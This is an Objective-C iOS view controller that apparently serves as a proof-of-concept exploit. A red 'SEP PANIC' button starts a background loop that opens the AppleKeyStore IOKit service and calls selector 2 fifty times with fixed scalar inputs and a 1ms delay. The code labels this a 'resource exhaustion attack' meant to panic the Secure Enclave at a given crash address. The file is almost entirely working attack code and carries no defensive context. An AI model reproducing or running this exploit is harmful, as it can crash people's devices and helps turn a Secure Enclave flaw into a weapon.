#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE_NAME "AppleKeyStore"
#define SEP_PANIC_THRESHOLD 50
#define SEP_PANIC_SELECTOR 2

static mach_port_t g_master_port = MACH_PORT_NULL;

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    IOMainPort(MACH_PORT_NULL, &g_master_port);

    UIButton *sepBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    sepBtn.frame = CGRectMake(40, self.view.bounds.size.height/2 - 40, self.view.bounds.size.width - 80, 80);
    [sepBtn setTitle:@"SEP PANIC" forState:UIControlStateNormal];
    [sepBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    sepBtn.backgroundColor = [UIColor redColor];
    sepBtn.layer.cornerRadius = 10;
    sepBtn.titleLabel.font = [UIFont boldSystemFontOfSize:28];
    [sepBtn addTarget:self action:@selector(triggerSEPPanic) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:sepBtn];

    UILabel *sepLabel = [[UILabel alloc] initWithFrame:CGRectMake(40, self.view.bounds.size.height/2 + 45, self.view.bounds.size.width - 80, 60)];
    sepLabel.text = @"Selector 2 resource exhaustion\n~41 calls triggers SEP sks task panic\nCrash @ 0x0006fea7";
    sepLabel.textColor = [UIColor grayColor];
    sepLabel.font = [UIFont systemFontOfSize:12];
    sepLabel.textAlignment = NSTextAlignmentCenter;
    sepLabel.numberOfLines = 3;
    [self.view addSubview:sepLabel];
}

- (void)triggerSEPPanic {
    NSLog(@"[SEP PANIC] Starting SEP resource exhaustion attack");
    NSLog(@"[SEP PANIC] Target: selector 2, ~41 calls to trigger sks task panic");
    NSLog(@"[SEP PANIC] Expected panic: SEP Panic: :sks /sks : 0x0006fea7...");

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(g_master_port, IOServiceMatching(AKS_SERVICE_NAME));
        if (!svc) {
            NSLog(@"[SEP PANIC] AppleKeyStore service not found!");
            return;
        }

        io_connect_t conn = IO_OBJECT_NULL;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0x2022, &conn);

        if (kr != KERN_SUCCESS || conn == IO_OBJECT_NULL) {
            NSLog(@"[SEP PANIC] Failed to open connection: 0x%x", kr);
            IOObjectRelease(svc);
            return;
        }

        NSLog(@"[SEP PANIC] Opened AppleKeyStore connection: 0x%x", conn);
        NSLog(@"[SEP PANIC] Calling selector 2 repeatedly (threshold ~41)...");

        // From SEP_PANIC_ANALYSIS.md:
        // Call selector 2 repeatedly (~41 times triggers crash)
        // Input: scalars[6] = {1, 0, 0, 0x10, 0, 0}
        // Output: 1 scalar
        // Delay: 1ms between calls

        for (int i = 0; i < SEP_PANIC_THRESHOLD; i++) {
            uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
            uint64_t out[1] = {0};
            uint32_t outCnt = 1;

            kr = IOConnectCallMethod(conn, SEP_PANIC_SELECTOR,
                                     scalars, 6, NULL, 0,
                                     out, &outCnt, NULL, NULL);

            NSLog(@"[SEP PANIC] Call %d/%d: kr=0x%x out=%llu",
                  i + 1, SEP_PANIC_THRESHOLD, kr, out[0]);

            if (i >= 38) {
                NSLog(@"[SEP PANIC] APPROACHING THRESHOLD - panic expected soon!");
            }

            // 1ms delay between calls (critical for SEP timing)
            usleep(1000);
        }

        NSLog(@"[SEP PANIC] Completed %d calls - if no panic, try again", SEP_PANIC_THRESHOLD);

        IOServiceClose(conn);
        IOObjectRelease(svc);
    });
}

@end
